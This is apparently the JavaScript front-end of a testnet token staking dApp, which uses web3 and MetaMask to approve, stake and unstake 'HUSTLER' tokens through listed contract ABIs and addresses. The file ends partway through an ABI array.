
if (typeof web3 !== 'undefined') { web3 = new Web3(web3.currentProvider); } else { 
    web3 = new Web3(new Web3.providers.HttpProvider("https://data-seed-prebsc-1-s1.binance.org:8545")); }
  
  //var bal = web3.fromWei(web3.eth.getBalance(web3.eth.coinbase));
  
  function reverseString(str) {
      // Step 1. Use the split() method to return a new array
      var splitString = str.split(""); // var splitString = "hello".split("");
      // ["h", "e", "l", "l", "o"]
   
      // Step 2. Use the reverse() method to reverse the new created array
      var reverseArray = splitString.reverse(); // var reverseArray = ["h", "e", "l", "l", "o"].reverse();
      // ["o", "l", "l", "e", "h"]
   
      // Step 3. Use the join() method to join all elements of the array into a string
      var joinArray = reverseArray.join(""); // var joinArray = ["o", "l", "l", "e", "h"].join("");
      // "olleh"
      
      //Step 4. Return the reversed string
      return joinArray; // "olleh"
  }
  
  let minABI = [
    {
      "constant":true,
      "inputs":[{"name":"_owner","type":"address"}],
      "name":"balanceOf",
      "outputs":[{"name":"balance","type":"uint256"}],
      "type":"function"
    },
    {
      "constant":true,
      "inputs":[],
      "name":"decimals",
      "outputs":[{"name":"decimals","type":"uint8"}],
      "type":"function"
    }
  ];
  
  
  
  
  const reversedNum = num => parseFloat(num.toString().split('').reverse().join('')) * Math.sign(num)
  
  function reverseNum(num) {
      return (
      parseFloat(
          num
          .toString()
          .split('')
          .reverse()
          .join('')
      ) * Math.sign(num)
      )
  }
  
  function addStr(str, index, stringToAdd){
      return str.substring(0, index) + stringToAdd + str.substring(index, str.length);
  }
  
  const forwarderOrigin = 'http://localhost:9011'
  
  const initialize = () => {
  
      if (ethereum.isMetaMask) {
          let metamask = "y";
          sessionStorage.setItem("MetaMask", metamask);
      }
      else {
          let metamask = "n";
          sessionStorage.setItem("MetaMask", metamask);
      }
  
  
      const balanceID = document.getElementById('BalanceID');
      const stakedBalance = document.getElementById('StakedBalance');
      const onboardButton = document.getElementById('connectButton');
      const Rewards = document.getElementById('Rewards');
      const Percentage = document.getElementById('RewardsPercentage');
  

      const ERC20HUSTLERABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newDistributor","type":"address"}],"name":"DistributorTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newStaking","type":"address"}],"name":"StakingTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newTreasury","type":"address"}],"name":"TreasuryTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newVault","type":"address"}],"name":"VaultTransferred","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"distributor","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"distributorMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"distributor_","type":"address"}],"name":"setDistributor","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staking_","type":"address"}],"name":"setStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"treasury_","type":"address"}],"name":"setTreasury","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"vault_","type":"address"}],"name":"setVault","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"stakeMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"staking","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner_","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"treasury","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"treasuryMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"vault","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
      const ERC20STAKINGABI = [{"inputs":[{"internalType":"address","name":"_HustlerToken","type":"address"},{"internalType":"address","name":"_stakedHustlerToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"bond","type":"address"},{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BondStakeHustler","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Stake","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Withdraw","type":"event"},{"inputs":[],"name":"HustlerToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"deposit","type":"uint256"},{"internalType":"address","name":"userAddress","type":"address"}],"name":"addBondContribution","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"rewardIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"value","type":"uint256"}],"name":"setRewardIndex","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"value","type":"address"}],"name":"setTreasuryAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deposit","type":"uint256"}],"name":"stakeHustler","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"stakedHustlerToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"startStake","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bool","name":"value","type":"bool"}],"name":"toggleWithdrawals","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"treasuryAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unstakeHustler","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawalsActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
      const ERC20STAKEDHUSTLERABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newDistributor","type":"address"}],"name":"DistributorTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newStaking","type":"address"}],"name":"StakingTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newTreasury","type":"address"}],"name":"TreasuryTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newVault","type":"address"}],"name":"VaultTransferred","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"distributor","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"distributorMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"distributor_","type":"address"}],"name":"setDistributor","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"staking_","type":"address"}],"name":"setStaking","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"treasury_","type":"address"}],"name":"setTreasury","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"vault_","type":"address"}],"name":"setVault","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"stakeMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"staking","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner_","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"treasury","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account_","type":"address"},{"internalType":"uint256","name":"amount_","type":"uint256"}],"name":"treasuryMint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"vault","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
      const HUSTERADDRESS = "0xA7ea52f25e4BDfB53Ffa4A62EA64d8C49abbA9D1";
      const hustlercoin = new web3.eth.Contract(ERC20HUSTLERABI, HUSTERADDRESS)
      const STAKEDHUSTLER = "0xf486225aE48937933e70814260cC954495f5b45e";
      const stakedhustlercoin = new web3.eth.Contract(ERC20STAKEDHUSTLERABI, STAKEDHUSTLER)
      //const stakingContract = "";
      const stakingContractAddress = "0x7A5BbBE01DEEe319Db71cD1db5876b243E7FCde8";
      const stakingContract = new web3.eth.Contract(ERC20STAKINGABI, stakingContractAddress)


      const stake = async () => {
        const senderAddress = await web3.eth.accounts.givenProvider.selectedAddress;
        var balance = await hustlercoin.methods.balanceOf(senderAddress).call();
        var balancex = await web3.utils.fromWei(balance, "ether");
        await web3.eth.sendTransaction({
            from: senderAddress,
            to: stakingContractAddress,
            data: stakingContract.methods.stakeHustler(web3.utils.toWei(balancex, "ether").toString()).encodeABI()
        }, function(error, hash){
            if (error) {
                console.log(error);
                onboardButton.innerHTML = "Error : " + error;
            } else {
                console.log(hash);
                onboardButton.innerHTML = "Staked Coins";
            }
        });
        balance = await hustlercoin.methods.balanceOf(senderAddress).call();
        balancex = await web3.utils.fromWei(balance, "ether");
        console.log(balancex);
        if (balancex == null) {
            balancex = "0";
        }
        const balances = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        const balancesx = await web3.utils.fromWei(balances, "ether");
        console.log(balancesx);
        if (balancesx == null) {
            balancesx = "0";
        }
        balanceID.innerHTML = balancex;
        stakedBalance.innerHTML = balancesx;
    }
      
    const unstake = async () => {
        const senderAddress = await web3.eth.accounts.givenProvider.selectedAddress;
        var balance = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        var balancex = await web3.utils.fromWei(balance, "ether");
        await web3.eth.sendTransaction({
            from: senderAddress,
            to: stakingContractAddress,
            data: stakingContract.methods.unstakeHustler().encodeABI()
        }, function(error, hash){
            if (error) {
                console.log(error);
                onboardButton.innerHTML = "Error : " + error;
            } else {
                console.log(hash);
                onboardButton.innerHTML = "Stake";
                onboardButton.onclick = stake;
            }
        });
        balance = await hustlercoin.methods.balanceOf(senderAddress).call();
        balancex = await web3.utils.fromWei(balance, "ether");
        console.log(balancex);
        if (balancex == null) {
            balancex = "0";
        }
        const balances = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        const balancesx = await web3.utils.fromWei(balances, "ether");
        console.log(balancesx);
        if (balancesx == null) {
            balancesx = "0";
        }
        balanceID.innerHTML = balancex;
        stakedBalance.innerHTML = balancesx;
    }


    const unstakecheck = async () => {
        const senderAddress = await web3.eth.accounts.givenProvider.selectedAddress;
        var balance = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        var balancex = await web3.utils.fromWei(balance, "ether");
        console.log(balancex);
            await  web3.eth.sendTransaction({
                from: senderAddress,
                to: STAKEDHUSTLER,
                data: stakedhustlercoin.methods.approve(stakingContractAddress, web3.utils.toWei((1e18).toString(), "ether")).encodeABI()
            }, function(error, hash){
                if (error) {
                    console.log(error)
                } else {
                    console.log(hash);
                    onboardButton.innerHTML = "Stake";
                }
            });
    }


      const transactions = async () => {
        const accounts = await web3.eth.requestAccounts().then(console.log);
        console.log(web3.eth.accounts.givenProvider.selectedAddress);
        const senderAddress = await web3.eth.accounts.givenProvider.selectedAddress;
        /*hustlercoin.methods.approve(stakingContractAddress, "100000000000000000000000000000000000000000000").send({ from: senderAddress }, function (err, res) {
            if (err) {
              console.log("An error occured", err)
              return
            }
            console.log("Hash of the transaction: " + res)
          })*/
          
        await  web3.eth.sendTransaction({
            from: senderAddress,
            to: HUSTERADDRESS,
            data: hustlercoin.methods.approve(stakingContractAddress, web3.utils.toWei((1e18).toString(), "ether")).encodeABI()
        }, function(error, hash){
            if (error) {
                console.log(error)
            } else {
                console.log(hash);
                onboardButton.innerHTML = "Stake";
            }
        });


        const balance = await hustlercoin.methods.balanceOf(senderAddress).call();
        const balancex = await web3.utils.fromWei(balance, "ether");
        const balances = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        const balancesx = await web3.utils.fromWei(balances, "ether");
        console.log(balancex);
        balanceID.innerHTML = balancex;
        stakedBalance.innerHTML = balancesx;
        onboardButton.onclick = stake;
          /*hustlercoin.methods.balanceOf(senderAddress).call(function (err, res) {
            if (err) {
              console.log("An error occured", err)
              return
            }
            console.log("The balance is: ", res)
            balance.innerHTML = res;
          })*/

          /*const balance = await web3.eth.call({
            to: HUSTERADDRESS, // contract address
            data: hustlercoin.methods.balanceOf(senderAddress).encodeABI()
        })
        .then(console.log);;
        //console.log(balance);
        */



         /* stakingContract.methods
            .stakePayOut(senderBalance)
            .send({ from: senderAddress }, function (err, res) {
                if (err) {
                console.log("An error occured", err)
                return
                }
                console.log("Hash of the transaction: " + res)
            }) */
      }


    const MetaMaskClientCheck = () => {
        onboardButton.onclick = onClickConnect;
        onboardButton.disabled = false;
    };
  
    const onClickConnect = async () => {
      try {
        web3.eth.requestAccounts();
        onboardButton.innerText = 'Approve tokens';
      } catch (error) {
        console.error(error);
      }
    const senderAddress = await web3.eth.accounts.givenProvider.selectedAddress;
      const balance = await hustlercoin.methods.balanceOf(senderAddress).call();
        const balancex = await web3.utils.fromWei(balance, "ether");
        const balances = await stakedhustlercoin.methods.balanceOf(senderAddress).call();
        const balancesx = await web3.utils.fromWei(balances, "ether");
        balanceID.innerHTML = balancex;
        stakedBalance.innerHTML = balancesx;
      if(balancesx == 0) {
        if(hustlercoin.methods.allowance(senderAddress, stakingContractAddress).call() == 0) {
            onboardButton.onclick = transactions;
            onboardButton.innerHTML = "Approve $HUSTLR";
        } else {
            onboardButton.innerHTML = "Stake";
            onboardButton.onclick = stake;
        }
      }
      if(balancesx > 0) {
        if(stakedhustlercoin.methods.allowance(senderAddress, stakingContractAddress).call() == 0) {
            onboardButton.onclick = unstakecheck;
            onboardButton.innerHTML = "Approve $a.HUSTLR";
        }
        else {
            onboardButton.onclick = unstake;
            onboardButton.innerHTML = "Unstake";
        }
      }

    };
    MetaMaskClientCheck();
  
  const sendTrans = () => {
      var abiArray = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"minTokensBeforeSwap","type":"uint256"}],"name":"MinTokensBeforeSwapUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"tokensSwapped","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"ethReceived","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"tokensIntoLiqudity","type":"uint256"}],"name":"SwapAndLiquify","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"enabled","type":"bool"}],"name":"SwapAndLiquifyEnabledUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"_liquidityFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_maxTxAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_taxFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tAmount","type":"uint256"}],"name":"deliver","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"excludeFromFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"excludeFromReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"geUnlockTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"includeInFee","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"includeInReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isExcludedFromFee","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isExcludedFromReward","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"time","type":"uint256"}],"name":"lock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tAmount","type":"uint256"},{"internalType":"bool","name":"deductTransferFee","type":"bool"}],"name":"reflectionFromToken","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"liquidityFee","type":"uint256"}],"name":"setLiquidityFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"maxTxPercent","type":"uint256"}],"name":"setMaxTxPercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"_enabled","type":"bool"}],"name":"setSwapAndLiquifyEnabled","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"taxFee","type":"uint256"}],"name":"setTaxFeePercent","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"swapAndLiquifyEnabled","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"rAmount","type":"uin